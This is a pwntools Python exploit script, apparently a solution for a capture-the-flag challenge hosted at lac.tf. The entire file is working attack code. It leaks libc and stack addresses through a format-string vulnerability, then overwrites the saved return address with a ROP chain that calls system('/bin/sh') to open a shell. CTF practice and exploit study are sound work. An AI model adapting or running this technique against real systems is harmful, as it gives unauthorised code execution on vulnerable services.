#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./rut_roh_relro_patched')
libc = ELF('libc.so.6')

host = args.HOST or 'lac.tf'
port = int(args.PORT or 31134)

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
    return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *fgets
continue
'''.format(**locals())

# -- Exploit goes here --

def find_leaks():
    affiche = b''
    for i in range(1,58):
        affiche += f'{i}=%{i}$p '.encode()
    return affiche

io = start()

# io.sendlineafter(b'post?\n',b'%p %p %p %p %p %p')
# io.interactive()
# exit(0)
# Leak alsr + pie
io.sendlineafter(b'post?\n',b'AAAA%1$p %5$pBBBB' + b'A'*400)
io.recvuntil(b'AAAA')
leak_aslr = int(io.recvuntil(b' ',drop=True)[2:],16)
leak_stack = int(io.recvuntil(b'BBBB',drop=True)[2:],16)

# 0x1c8
# _IO_2_1_stdout_+131
libc.address = leak_aslr - (libc.sym['_IO_2_1_stdout_']+131)
saved_rip = leak_stack - 0x1c8 + 0x3c8 + 8
# saved_rip += 0x10

log.success(f'{libc.address = :x} {saved_rip = :x}')

rop = ROP(libc)
rop.rdi = next(libc.search(b'/bin/sh\0'))
rop.system()

payload = fmtstr_payload(6, {saved_rip:rop.chain()})
io.sendlineafter(b'post?\n',payload)

io.interactive()

